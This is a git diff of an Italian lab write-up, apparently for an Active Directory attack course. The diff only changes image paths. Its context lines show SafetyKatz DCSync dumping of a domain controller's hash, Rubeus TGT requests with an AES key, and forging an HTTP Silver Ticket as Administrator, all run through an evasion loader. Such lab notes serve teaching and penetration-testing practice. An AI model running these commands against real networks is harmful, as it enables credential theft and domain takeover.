@@ -18,7 +18,7 @@ Per recuperare NTLM hash del host dcorp-dc$ qualora lo avessimo perso, eseguire 
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\dcorp-dc$" "exit"
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 A questo punto siamo pronti a forgiare il Silver Ticket
 
@@ -28,7 +28,7 @@ Spawnare un prompt con svcadmin (Facoltativo e' sufficiente un prompt amministra
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### HTTP Service - Silver Ticket
 
@@ -38,9 +38,9 @@ Nel nuovo prompt possiamo eseguire Rubeus usando Loader per la creazione del Sil
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:922dbee7f8548b8a2dc279d0c47d8d1c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Per verificare che il silver ticket sia nella nostra klist eseguiamo
 
@@ -48,7 +48,7 @@ Per verificare che il silver ticket sia nella nostra klist eseguiamo
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 A questo punto accediamo dcorp-dc usando il FQDN visto che il ticket e' stato forgiato usando l'FQDN dcorp-dc.dollarcorp.moneycorp.local usando winrs&#x20;
 
